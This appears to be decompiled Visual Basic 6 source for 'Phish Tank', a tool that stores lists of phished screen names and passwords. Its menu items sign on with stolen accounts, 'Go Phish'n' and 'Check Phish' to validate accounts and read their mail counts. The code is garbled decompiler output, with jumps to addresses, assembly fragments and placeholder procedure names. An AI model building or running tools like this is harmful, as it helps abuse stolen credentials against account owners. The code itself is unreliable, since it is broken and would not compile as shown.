VERSION 5.00
Begin VB.Form Form1
  Caption = "<>< Phish Tank ><>"
  MousePointer = 99 'Custom
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  Picture = "Form1.frx":0
  BorderStyle = 1 'Fixed Single
  Icon = "Form1.frx":8842
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  ClientLeft = 150
  ClientTop = 435
  ClientWidth = 3090
  ClientHeight = 2250
  MouseIcon = "Form1.frx":8B4C
  StartUpPosition = 2 'CenterScreen
  Begin TextBox Text3
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 2520
    Top = 1560
    Width = 495
    Height = 285
    Text = "M/S?"
    TabIndex = 13
  End
  Begin ListBox List3
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 2520
    Top = 0
    Width = 495
    Height = 1230
    TabIndex = 12
  End
  Begin CommandButton Command6
    Caption = "Options"
    Left = 120
    Top = 1920
    Width = 2895
    Height = 255
    TabIndex = 10
  End
  Begin CommandButton Command5
    Caption = "Clear List"
    Left = 720
    Top = 4440
    Width = 2655
    Height = 255
    TabIndex = 9
  End
  Begin CommandButton Command4
    Caption = "Remove"
    Left = 2160
    Top = 4440
    Width = 1215
    Height = 255
    TabIndex = 8
  End
  Begin TextBox Text2
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 1440
    Top = 1560
    Width = 1095
    Height = 285
    Text = "Password"
    TabIndex = 6
  End
  Begin TextBox Text1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 1560
    Width = 1095
    Height = 285
    Text = "Name"
    TabIndex = 5
  End
  Begin ListBox List2
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 1320
    Top = 0
    Width = 1215
    Height = 1230
    TabIndex = 4
  End
  Begin ListBox List1
    BackColor = &H0&
    ForeColor = &HFF&
    Left = 120
    Top = 0
    Width = 1215
    Height = 1230
    TabIndex = 3
  End
  Begin CommandButton Command3
    Caption = "Add"
    Left = 720
    Top = 4440
    Width = 1215
    Height = 255
    TabIndex = 2
  End
  Begin CommandButton Command2
    Caption = "Load"
    Left = 2280
    Top = 3960
    Width = 1215
    Height = 255
    TabIndex = 1
  End
  Begin CommandButton Command1
    Caption = "Save"
    Left = 840
    Top = 3960
    Width = 1215
    Height = 255
    TabIndex = 0
  End
  Begin Label Label2
    Caption = "List Count:"
    ForeColor = &HFF&
    Left = 120
    Top = 1320
    Width = 855
    Height = 255
    TabIndex = 11
    BackStyle = 0 'Transparent
  End
  Begin Label Label1
    Caption = "0"
    ForeColor = &HFF&
    Left = 960
    Top = 1320
    Width = 1575
    Height = 255
    TabIndex = 7
    BackStyle = 0 'Transparent
  End
  Begin Menu Options
    Caption = "Options"
    Begin Menu Add
      Caption = "Add "
    End
    Begin Menu Remove
      Caption = "Remove"
    End
    Begin Menu ClearList
      Caption = "Clear List"
    End
    Begin Menu g
      Caption = "-"
    End
    Begin Menu SaveList
      Caption = "Save List"
    End
    Begin Menu LoadList
      Caption = "Load List"
    End
    Begin Menu h
      Caption = "-"
    End
    Begin Menu Signon
      Caption = "Sign On Using Phish"
    End
    Begin Menu phish
      Caption = "Go Phish'n"
    End
    Begin Menu CheckPhish
      Caption = "Check Phish"
    End
    Begin Menu bar
      Caption = "-"
    End
    Begin Menu about
      Caption = "About DarkWater"
    End
    Begin Menu notes
      Caption = "Beta Notes(please read)"
    End
    Begin Menu report
      Caption = "Report a Bug"
    End
    Begin Menu ice
      Caption = "IceRebels"
    End
  End
End

Attribute VB_Name = "Form1"

Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpString As Any, ByVal lpFileName As String) As Long
Private Declare Sub ReleaseCapture Lib "User32"()
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
Private Declare Sub ShowWindow Lib "User32"()
Private Declare Sub ShowCursor Lib "User32"()
Private Declare Sub SetWindowPos Lib "User32"()
Private Declare Sub SetCursorPos Lib "User32"()
Private Declare Sub SendMessageA Lib "User32"()
Private Declare Function ReadProcessMemory Lib "kernel32" Alias "ReadProcessMemory" (ByVal hProcess As Long, lpBaseAddress As Any, lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Sub PostMessageA Lib "User32"()
Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" Alias "OpenProcess" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Private Declare Sub GetWindowThreadProcessId Lib "User32"()
Private Declare Sub GetWindowTextLengthA Lib "User32"()
Private Declare Sub GetWindowTextA Lib "User32"()
Private Declare Sub GetSubMenu Lib "User32"()
Private Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" (ByVal lpApplicationName As String, ByVal lpKeyName As Any, ByVal lpDefault As String, ByVal lpReturnedString As String, ByVal nSize As Long, ByVal lpFileName As String) As Long
Private Declare Sub GetMenuStringA Lib "User32"()
Private Declare Sub GetMenuItemID Lib "User32"()
Private Declare Sub GetMenuItemCount Lib "User32"()
Private Declare Sub GetMenu Lib "User32"()
Private Declare Sub GetCursorPos Lib "User32"()
Private Declare Sub FindWindowExA Lib "User32"()
Private Declare Sub FindWindowA Lib "User32"()
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Private Declare Function CloseHandle Lib "kernel32" Alias "CloseHandle" (ByVal hObject As Long) As Long
Private Declare Sub IsWindowVisible Lib "User32"()


Private Sub List2_Click()
  var_20 = List1.ListCount
  setg al
  If eax = 0 Then GoTo loc_0047480E
  var_20 = List2.ListIndex
  List2.ListIndex = var_20
  var_20 = List2.ListIndex
  List2.ListIndex = var_20
  Exit Sub
End Sub

Private Sub List2_DblClick()
  var_eax = Call Form1.Remove_Click
End Sub

Private Sub List3_Click()
  var_20 = List1.ListCount
  setg al
  If eax = 0 Then GoTo loc_00474A8E
  var_20 = List3.ListIndex
  List3.ListIndex = var_20
  var_20 = List3.ListIndex
  List3.ListIndex = var_20
  Exit Sub
End Sub

Private Sub List3_DblClick()
  var_eax = Call Form1.Remove_Click
End Sub

Private Sub Text2_KeyPress(KeyAscii As Integer)
  If KeyAscii <> 13 Then GoTo loc_004759CE
  var_eax = Text3.SetFocus
  Exit Sub
End Sub

Private Sub ice_Click()
  var_eax = Form11.Show var_18
End Sub

Private Sub Text3_KeyPress(KeyAscii As Integer)
  If KeyAscii <> 13 Then GoTo loc_00475ABD
  var_eax = Call Form1.Add_Click
  var_eax = Text1.SetFocus
  Exit Sub
End Sub

Private Sub report_Click()
  var_eax = Form10.Show var_18
End Sub

Private Sub notes_Click()
  var_eax = Form9.Show var_18
End Sub

Private Sub about_Click()
  var_eax = Form8.Show var_18
End Sub

Private Sub LoadList_Click()
  var_eax = Form7.Show var_18
End Sub

Private Sub CheckPhish_Click()
  Dim var_80 As ListBox
  call Proc_6_2_47D850(var_38, var_3C, var_40)
  var_7C = List1.ListCount
  var_7C = var_7C - 0001h
  var_60 = var_7C
  For var_24 = "" To var_7C Step 1
  var_C0 = var_24
  If var_C0 = 0 Then GoTo loc_00472E43
  var_38 = List1.List(CInt(var_28))
  var_3C = List2.List(CInt(var_2C))
  call Proc_6_0_47D320(0, 0, Me)
  call Proc_6_1_47D6A0(Me, var_48, var_44)
  If call Proc_6_1_47D6A0(Me, var_48, var_44) <> 0 Then GoTo loc_00472D2C
  call MailCountSent(Me, , )
  If call MailCountSent(Me, , ) <> 0 Then GoTo loc_00472CD0
  var_80 = var_38
  var_24 = CInt(var_004136C4)
  List3.List(var_24) = var_38
  If var_24 >= 0 Then GoTo loc_00472D19
  GoTo loc_00472D04
  var_80 = var_38
  var_24 = CInt(var_004136CC)
  List3.List(var_24) = var_38
  If var_24 >= 0 Then GoTo loc_00472D19
  call Proc_47D820(CheckObj(var_80, var_004136B0, 236), call MailCountSent(Me, , ), Me)
  GoTo loc_00472E20
  var_80 = var_38
  var_24 = CInt(var_38)
  var_eax = List1.RemoveItem var_24
  var_24 = CInt(var_38)
  var_D8 = var_24
  var_eax = List2.RemoveItem var_24
  var_24 = CInt(var_38)
  var_eax = List3.RemoveItem var_24
  Next var_24
  var_C0 = Next var_24
  GoTo loc_00472B87
  Exit Sub
  Exit Sub
End Sub

Private Sub Add_Click()
  Dim var_E4 As Variant
  var_20 = Text1.Text
  var_1C = var_20
  var_20 = Text2.Text
  var_18 = var_20
  var_20 = Text1.Text
  var_24 = Text2.Text
  If (var_20 = "Name") = 0 Then GoTo loc_004728E5
  var_20 = Text1.Text
  ebx = (var_20 = vbNullString) + 1
  If (var_20 = vbNullString) + 1 = 0 Then GoTo loc_004722E6
  var_3C = "Add screen name"
  GoTo loc_0047294C
  var_20 = Text2.Text
  ebx = (var_20 = vbNullString) + 1
  If (var_20 = vbNullString) + 1 = 0 Then GoTo loc_004723B8
  var_3C = "Add Password"
  GoTo loc_0047294C
  var_E4 = var_3C
  var_A4 = var_1C
  var_20 = CStr(Trim(var_1C))
  var_eax = List1.AddItem var_20, var_B0
  var_A4 = var_18
  var_20 = CStr(Trim(var_18))
  var_eax = List2.AddItem var_20, var_B0
  var_34 = List2.AddItem var_20, var_B0
  var_4C = Ucase(List2.AddItem var_20, var_B0)
  var_64 = var_4C
  var_ret_1 = (var_4C = &H4136C4)
  var_ret_2 = (Ucase(var_4C) = &H4136CC)
  call Or(var_9C, var_ret_2, var_ret_1, Me, Me)
  If CBool(Or(var_9C, var_ret_2, var_ret_1, Me, Me)) = 0 Then GoTo loc_004726F2
  var_20 = CStr(Trim(Me))
  Text3.OLEDragMode = var_20
  GoTo loc_0047276A
  var_eax = List3.AddItem var_004136D4, var_A0
  var_EC = List3.AddItem var_004136D4, var_A0
  var_E0 = List1.ListCount
  var_20 = var_E0
  Text1.Text = vbNullString
  Text2.Text = vbNullString
  Text3.Text = vbNullString
  GoTo loc_00472957
  var_3C = "Please Enter a Screen Name and Password To Add"
  Exit Sub
End Sub

Private Sub Clearlist_Click()
  var_C0 = List1.ListCount
  If eax = 0 Then GoTo loc_00473003
  var_3C = "No One on List"
  GoTo loc_00473186
  var_24 = MsgBox("Clear List", 36, var_4C, var_5C, var_6C)
  If (var_24 = 6) = 0 Then GoTo loc_0047316A
  var_eax = List1.Clear
  var_eax = List2.Clear
  var_28 = 0
  Exit Sub
End Sub

Private Sub Signon_Click()
  Dim var_B8 As ListBox
  Dim var_BC As ListBox
  var_B8 = List1.ListIndex
  setg bl
  If ebx = 0 Then GoTo loc_0047577F
  var_B8 = List1.ListIndex
  var_18 = List1.List(var_B8)
  var_BC = List2.ListIndex
  var_1C = List2.List(var_BC)
  call Proc_6_0_47D320(var_18, var_1C, var_34)
  GoTo loc_004757ED
  var_44 = "Please Select A Screenname to sign on with"
  Exit Sub
End Sub

Private Sub SaveList_Click()
  var_eax = Form6.Show var_18
End Sub

Private Sub Command2_Click()
  call FindMailBox("C:\test.lst", var_1C, var_20)
  Exit Sub
End Sub

Private Sub Command4_Click()
  Dim var_20 As ListBox
  Dim var_B0 As ListBox
  var_A4 = List1.ListCount
  If var_B0 = 0 Then GoTo loc_00473A92
  var_30 = "No One on List"
  GoTo loc_00473D91
  var_A4 = List1.SelCount
  If ebx = 0 Then GoTo loc_00473B0D
  var_68 = "Highlight Name"
  GoTo loc_00473B86
  var_A4 = List2.SelCount
  If ebx = 0 Then GoTo loc_00473BD1
  var_30 = "Highlight Password"
  GoTo loc_00473D8F
  var_B0 = var_20
  var_A4 = List1.ListIndex
  var_eax = List1.RemoveItem var_A4
  var_A4 = List2.ListIndex
  var_eax = List2.RemoveItem var_A4
  var_A4 = List1.ListCount
  var_18 = var_A4
  Exit Sub
End Sub

Private Sub Command5_Click()
  var_C0 = List1.ListCount
  If eax = 0 Then GoTo loc_00473F23
  var_3C = "No One on List"
  GoTo loc_004740A6
  var_24 = MsgBox("Clear List", 36, var_4C, var_5C, var_6C)
  If (var_24 = 6) = 0 Then GoTo loc_0047408A
  var_eax = List1.Clear
  var_eax = List2.Clear
  var_28 = 0
  Exit Sub
End Sub

Private Sub Command6_Click()
  Exit Sub
End Sub

Private Sub phish_Click()
  var_eax = Form2.Show var_18
End Sub

Private Sub Command3_Click()
  Dim var_38 As TextBox
  Dim var_28 As ListBox
  var_20 = Text1.Text
  var_1C = var_20
  var_20 = Text2.Text
  var_18 = var_20
  var_20 = Text1.Text
  If (var_20 = vbNullString) + 1 = 0 Then GoTo loc_004735FF
  var_38 = "Add screen name"
  GoTo loc_004738D1
  var_20 = Text2.Text
  If (var_20 = vbNullString) + 1 = 0 Then GoTo loc_004736D3
  var_38 = "Add Password"
  GoTo loc_004738D1
  var_eax = List1.AddItem var_1C, var_6C
  var_eax = List2.AddItem var_18, var_6C
  var_B8 = var_28
  var_AC = List1.ListCount
  var_20 = var_AC
  Text1.Text = vbNullString
  Text2.Text = vbNullString
  Exit Sub
End Sub

Private Sub Command1_Click()
  call MailCountNew("C:\test.lst", var_1C, var_20)
  Exit Sub
End Sub

Private Sub Remove_Click()
  Dim var_1C As ListBox
  Dim var_20 As ListBox
  Dim var_B0 As ListBox
  var_A4 = List1.ListCount
  If var_B0 = 0 Then GoTo loc_00474F72
  var_30 = "No One on List"
  GoTo loc_00475302
  var_A4 = List1.SelCount
  If ebx = 0 Then GoTo loc_00474FED
  var_68 = "Highlight Name"
  GoTo loc_00475066
  var_A4 = List2.SelCount
  If ebx = 0 Then GoTo loc_004750B1
  var_30 = "Highlight Password"
  GoTo loc_00475300
  var_B0 = var_20
  var_A4 = List1.ListIndex
  var_eax = List1.RemoveItem var_A4
  var_A4 = List2.ListIndex
  var_eax = List2.RemoveItem var_A4
  var_B0 = var_1C
  var_A4 = List3.ListIndex
  var_eax = List3.RemoveItem var_A4
  var_A4 = List1.ListCount
  var_18 = var_A4
  Exit Sub
End Sub

Private Sub Form_Unload(Cancel As Integer)
  End
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
  If KeyAscii <> 13 Then GoTo loc_004758FE
  var_eax = Text2.SetFocus
  Exit Sub
End Sub

Private Sub List1_Click()
  var_20 = List1.ListCount
  setg al
  If eax = 0 Then GoTo loc_0047458E
  var_20 = List1.ListIndex
  List1.ListIndex = var_20
  var_20 = List1.ListIndex
  List1.ListIndex = var_20
  Exit Sub
End Sub

Private Sub List1_DblClick()
  var_eax = Call Form1.Remove_Click
End Sub

Public Sub Proc_0_28_474270

End Sub
